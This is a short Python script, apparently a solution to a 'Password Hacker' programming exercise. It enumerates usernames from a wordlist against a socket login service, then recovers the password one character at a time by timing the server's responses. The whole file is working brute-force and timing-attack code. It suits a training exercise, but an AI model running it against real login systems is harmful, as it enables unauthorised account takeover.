import socket
import sys
import json
import string
from datetime import datetime

host = sys.argv[1]
port = int(sys.argv[2])
buffer_size = 1024

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    def fun():
        with open(r'C:\Users\HP\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt',
                  'r') as f:
            for keywords in f.readlines():
                logic = keywords.strip('\n')
                info = {"login": logic, "password": " "}
                data = json.dumps(info)
                s.send(data.encode('utf-8'))
                response = json.loads(s.recv(buffer_size).decode())
                if response["result"] == 'Wrong password!':
                    break
            return logic


    s.connect((host, port))

    response = ''
    condition = True
    alphabet = string.ascii_letters + string.digits

    login = fun()
    password = ""
    while True:
        for char in alphabet:
            first_letter = ""
            data = {"login": login,
                    "password": password + char
                    }
            data = json.dumps(data)

            s.send(data.encode())
            start = datetime.now()
            response = json.loads(s.recv(buffer_size).decode())
            finish = datetime.now()
            diff = (finish - start).total_seconds()
            if diff >= 0.1:
                first_letter = char
                password += first_letter
                break
            elif response["result"] == "Connection success!":
                print(data)
                exit()
